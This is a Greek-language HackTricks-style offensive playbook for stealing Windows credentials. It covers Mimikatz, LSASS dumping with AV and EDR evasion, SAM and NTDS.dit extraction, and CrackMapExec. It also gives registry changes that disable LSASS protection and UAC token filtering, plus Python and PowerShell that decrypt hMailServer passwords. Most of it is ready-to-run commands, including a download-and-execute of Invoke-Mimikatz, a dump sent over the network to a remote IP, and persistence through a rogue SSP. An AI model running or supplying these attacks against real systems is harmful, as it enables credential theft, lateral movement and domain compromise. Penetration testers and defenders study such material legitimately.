# Κλοπή Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για ορισμένες πιθανές προστασίες των credentials εδώ.**](credentials-protections.md) **Αυτές οι προστασίες μπορεί να αποτρέψουν το Mimikatz από την εξαγωγή ορισμένων credentials.**

## Credentials με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε passwords και hashes** μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Παράκαμψη AV

### Procdump + Mimikatz

Καθώς **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από τον Defender.\ 
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **dump the lsass process**, **download the dump** και να **extract** τα **credentials τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Αυτή η διαδικασία γίνεται αυτόματα με [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Κάποια **AV** μπορεί να **εντοπίζουν** ως **κακόβουλη** τη χρήση του **procdump.exe to dump lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" and "lsass.exe"**. Έτσι είναι πιο **διακριτικό** να **περάσετε** ως **argument** το **PID** του lsass.exe στο procdump **instead of** το **όνομα lsass.exe.**

### Δημιουργία dump του lsass με **comsvcs.dll**

Μια DLL με όνομα **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνη για το **dumping process memory** σε περίπτωση crash. Αυτή η DLL περιέχει μια **function** με όνομα **`MiniDumpW`**, σχεδιασμένη να καλείται μέσω του `rundll32.exe`.\
Δεν έχει σημασία η χρήση των πρώτων δύο arguments, αλλά το τρίτο χωρίζεται σε τρία συστατικά. Το process ID που θα γίνει dump αποτελεί το πρώτο συστατικό, η θέση του αρχείου dump αντιπροσωπεύει το δεύτερο, και το τρίτο συστατικό είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Με την ανάλυση αυτών των τριών συστατικών, η DLL προχωρά στη δημιουργία του αρχείου dump και στη μεταφορά της μνήμης της συγκεκριμένης διεργασίας σε αυτό το αρχείο.\
Η χρήση της **comsvcs.dll** είναι εφικτή για το dump της διεργασίας lsass, αποφεύγοντας έτσι την ανάγκη να ανεβάσετε και να εκτελέσετε procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Η παρακάτω εντολή χρησιμοποιείται για την εκτέλεση:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Κάντε δεξί κλικ στο Task Bar και κάντε κλικ στο Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και κάντε κλικ στο "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο από τη Microsoft εκτελέσιμο, το οποίο αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass με PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα Protected Process Dumper Tool που υποστηρίζει την απόκρυψη των memory dump και τη μεταφορά τους σε απομακρυσμένους σταθμούς εργασίας χωρίς να τα αποθηκεύει στον δίσκο.

**Κύριες λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Απόκρυψη των memory dump αρχείων για να αποφεύγεται η ανίχνευση από τους signature-based μηχανισμούς του Defender
3. Αποστολή των memory dump με RAW και SMB upload μεθόδους χωρίς να αποθηκεύονται στον δίσκο (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon μεταφέρει έναν τριών σταδίων dumper με το όνομα **LalsDumper** που δεν καλεί ποτέ `MiniDumpWriteDump`, οπότε τα EDR hooks σε εκείνο το API δεν ενεργοποιούνται ποτέ:

1. **Stage 1 loader (`lals.exe`)** – ψάχνει στο `fdp.dll` για έναν placeholder που αποτελείται από 32 μικρά γράμματα `d`, τον αντικαθιστά με το απόλυτο μονοπάτι προς το `rtu.txt`, αποθηκεύει το patched DLL ως `nfdp.dll` και καλεί `AddSecurityPackageA("nfdp","fdp")`. Αυτό αναγκάζει το **LSASS** να φορτώσει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – όταν το LSASS φορτώσει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, κάνει XOR κάθε byte με `0x20` και χαρτογραφεί το decoded blob στη μνήμη πριν μεταφέρει την εκτέλεση.
3. **Stage 3 dumper** – το χαρτογραφημένο payload επαναπραγματοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls** που επιλύονται από hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Μια ειδική export με όνομα `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, stream-γράφει μια συμπιεσμένη LSASS dump στο αρχείο και κλείνει το handle ώστε να μπορεί να γίνει exfiltration αργότερα.

Σημειώσεις χειριστή:

* Διατηρήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο φάκελο. Το Stage 1 ξαναγράφει τον hard-coded placeholder με το απόλυτο μονοπάτι προς το `rtu.txt`, οπότε το να τα χωρίσετε σπάει την αλυσίδα.
* Η εγγραφή γίνεται προσθέτοντας `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να seed αυτή την τιμή μόνοι σας ώστε το LSASS να ξαναφορτώνει το SSP σε κάθε εκκίνηση.
* Τα αρχεία `%TEMP%\*.ddt` είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά και στη συνέχεια δώστε τα σε Mimikatz/Volatility για credential extraction.
* Η εκτέλεση του `lals.exe` απαιτεί admin/SeTcb rights ώστε το `AddSecurityPackageA` να πετύχει· μόλις η κλήση επιστρέψει, το LSASS φορτώνει διαφανώς το rogue SSP και εκτελεί Stage 2.
* Η αφαίρεση του DLL από το δίσκο δεν το απομακρύνει από το LSASS. Είτε διαγράψτε την καταχώρηση registry και επανεκκινήστε το LSASS (reboot) είτε αφήστε το για long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Εξαγωγή του NTDS.dit από τον στοχευόμενο DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Εξαγωγή του ιστορικού κωδικών του NTDS.dit από τον DC-στόχο
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνισε την ιδιότητα pwdLastSet για κάθε λογαριασμό του NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Κλοπή SAM & SYSTEM

Αυτά τα αρχεία πρέπει να βρίσκονται στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM_. Αλλά **δεν μπορείτε απλά να τα αντιγράψετε με τον κανονικό τρόπο** επειδή προστατεύονται.

### Από το Registry

Ο πιο εύκολος τρόπος να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφό τους από το Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στη μηχανή Kali σας και **εξαγάγετε τα hashes** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτή την υπηρεσία. Πρέπει να είστε Administrator.

#### Using vssadmin

Το vssadmin binary είναι διαθέσιμο μόνο στις εκδόσεις Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από **Powershell**. Αυτό είναι ένα παράδειγμα του **πώς να αντιγράψετε το SAM file** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να το χρησιμοποιήσετε για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Διαπιστευτήρια Active Directory - NTDS.dit**

Το **NTDS.dit** αρχείο είναι γνωστό ως η καρδιά του **Active Directory**, περιέχοντας κρίσιμα δεδομένα για αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εκεί αποθηκεύονται τα **password hashes** για τους **domain users**. Το αρχείο αυτό είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στο **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτή τη βάση δεδομένων διατηρούνται τρεις κύριοι πίνακες:

- **Data Table**: Αυτός ο πίνακας αναλαμβάνει την αποθήκευση λεπτομερειών για αντικείμενα όπως χρήστες και ομάδες.
- **Link Table**: Παρακολουθεί σχέσεις, όπως memberships ομάδων.
- **SD Table**: Εδώ φυλάσσονται οι **Security descriptors** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Τα Windows χρησιμοποιούν _Ntdsa.dll_ για την αλληλεπίδραση με αυτό το αρχείο και αυτό χρησιμοποιείται από το _lsass.exe_. Επομένως, **τμήμα** του **NTDS.dit** αρχείου μπορεί να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορεί να βρείτε τα πιο πρόσφατα προσπελασμένα δεδομένα πιθανώς λόγω βελτίωσης της απόδοσης με τη χρήση ενός **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash κρυπτογραφείται 3 φορές:

1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και **RC4**.
2. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **PEK** και **RC4**.
3. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας **DES**.

Το **PEK** έχει την ίδια τιμή σε κάθε domain controller, αλλά είναι κρυπτογραφημένο μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του αρχείου **SYSTEM** του domain controller (είναι διαφορετικό ανάμεσα στους domain controllers). Γι' αυτό, για να εξαγάγετε τα credentials από το αρχείο NTDS.dit χρειάζεστε τα αρχεία **NTDS.dit** και **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Αντιγραφή NTDS.dit χρησιμοποιώντας Ntdsutil

Διαθέσιμο από το Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε το κόλπο [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του αρχείου **SYSTEM** (πάλι, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) κόλπο).

### **Εξαγωγή hashes από NTDS.dit**

Μόλις έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **extract them automatically** χρησιμοποιώντας έναν έγκυρο domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλα αρχεία NTDS.dit** συνιστάται να τα εξάγετε χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων domain από NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Δεν εξάγονται μόνο τα secrets αλλά και ολόκληρα τα αντικείμενα και τα attributes τους για περαιτέρω εξαγωγή πληροφοριών όταν το raw αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, supplemental credentials όπως cleartext passwords, kerberos ή trust keys, NT & LM password histories). Μαζί με άλλες πληροφορίες, τα ακόλουθα δεδομένα εξάγονται: λογαριασμοί χρηστών και μηχανημάτων με τα hashes τους, UAC flags, χρονικές σφραγίδες για το τελευταίο logon και την αλλαγή password, περιγραφές λογαριασμών, ονόματα, UPN, SPN, groups και recursive memberships, δέντρο organizational units και membership, trusted domains με trusts type, direction και attributes...

## Lazagne

Κατεβάστε το binary από [here](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξαγάγετε credentials από διάφορα software.
```
lazagne.exe all
```
## Άλλα εργαλεία για εξαγωγή credentials από το SAM και το LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για να εξάγει credentials από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή credentials από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή credentials από το SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατεβάστε το από:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλά **εκτελέστε το** και οι κωδικοί θα εξαχθούν.

## Εξόρυξη ανενεργών συνεδριών RDP και αποδυνάμωση των μηχανισμών ασφαλείας

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Εξερχόμενοι στόχοι RDP** – αναλύστε κάθε user hive στο `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε υποκλειδί αποθηκεύει το όνομα του server, `UsernameHint`, και το timestamp της τελευταίας εγγραφής. Μπορείτε να αναπαράγετε τη λογική του FinalDraft με PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Αποδείξεις εισερχόμενων RDP** – ερωτήστε το log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` για Event IDs **21** (επιτυχής σύνδεση) και **25** (αποσύνδεση) για να χαρτογραφήσετε ποιος διαχειρίστηκε το μηχάνημα:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Μόλις γνωρίζετε ποιος Domain Admin συνδέεται τακτικά, dump LSASS (με LalsDumper/Mimikatz) ενώ η **αποσυνδεδεμένη** συνεδρία τους εξακολουθεί να υπάρχει. CredSSP + NTLM fallback αφήνει τον verifier και τα tokens τους στο LSASS, τα οποία μπορούν στη συνέχεια να αναπαραχθούν μέσω SMB/WinRM για να αποκτήσετε `NTDS.dit` ή να εγκαταστήσετε persistence σε domain controllers.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Η ρύθμιση `DisableRestrictedAdmin=1` αναγκάζει την πλήρη credential/ticket reuse κατά το RDP, επιτρέποντας pivots τύπου pass-the-hash.
* Το `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το UAC token filtering, έτσι ώστε οι local admins να λαμβάνουν unrestricted tokens μέσω του δικτύου.
* Το `DSRMAdminLogonBehavior=2` επιτρέπει στον DSRM administrator να κάνει log on ενώ ο DC είναι online, δίνοντας στους attackers έναν ακόμη built-in high-privilege account.
* Το `RunAsPPL=0` αφαιρεί τις LSASS PPL προστασίες, κάνοντας την πρόσβαση στη μνήμη trivial για dumpers όπως το LalsDumper.

## hMailServer database credentials (post-compromise)

Το hMailServer αποθηκεύει το DB password στο `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` κάτω από `[Database] Password=`. Η τιμή είναι Blowfish-encrypted με το static key `THIS_KEY_IS_NOT_SECRET` και 4-byte word endianness swaps. Χρησιμοποιήστε το hex string από το INI με αυτό το Python snippet:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Με το clear-text password, αντιγράψτε τη SQL CE database για να αποφύγετε file locks, φορτώστε τον 32-bit provider και αναβαθμίστε αν χρειάζεται πριν κάνετε query στα hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Η στήλη `accountpassword` χρησιμοποιεί το hMailServer hash format (hashcat mode `1421`). Το Cracking αυτών των τιμών μπορεί να παρέχει επαναχρησιμοποιήσιμα credentials για WinRM/SSH pivots.

## Αναφορές

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
